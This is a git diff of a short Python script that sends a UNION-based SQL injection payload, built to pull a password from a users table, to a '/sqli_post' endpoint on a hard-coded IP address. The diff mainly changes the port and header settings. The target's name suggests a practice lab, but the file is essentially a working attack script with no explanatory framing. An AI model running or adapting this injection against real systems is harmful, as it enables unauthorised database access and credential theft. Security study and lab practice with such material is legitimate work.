@@ -3,22 +3,22 @@ Description:
 Autor: Yue
 Date: 2024-09-21 11:41:23
 LastEditors: Yue
-LastEditTime: 2024-09-21 12:06:34
+LastEditTime: 2024-09-22 19:26:09
 '''
 import requests
 
 boundary1 = "----WebKitFormBoundaryIABEqlYAQTic2F4P"
 headers = {
- 'Host': '101.91.208.121:9001',
+ 'Host': '101.91.208.121:9002',
  # 'Content-Length': '64',
  'Cache-Control': 'max-age=0',
  'Upgrade-Insecure-Requests': '1',
  'Origin': 'http://101.91.208.121:9001',
- 'Content-Type': 'application/x-www-form-urlencoded',
+#  'Content-Type': 'application/x-www-form-urlencoded',
 #  'Content-Type': f'multipart/form-data; boundary={boundary1}',
- 'Content-Type': 'text/plain',
+#  'Content-type': 'application/x-www-form-urlencoded',
 #   'Content-Type': 'application/x-www-form-urlencoded',
-#  'Content-Type': 'multipart/form-data;',
+ 'Content-Type': 'multipart/form-data;',
  'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)'
 'Chrome/123.0.0.0 Safari/537.36',
  'Accept':
@@ -38,8 +38,8 @@ headers = {
 # --{boundary1}
 # """
 
-files = {
+data = {
  'id': '1 UNION SELECT null, password FROM users WHERE id = 1 -- '
 }
-response = requests.post('http://101.91.208.121:9001/sqli_post', headers=headers, data=files, verify=False)
+response = requests.post('http://101.91.208.121:9002/sqli_post', headers=headers, data=data, verify=False)
 print(response)
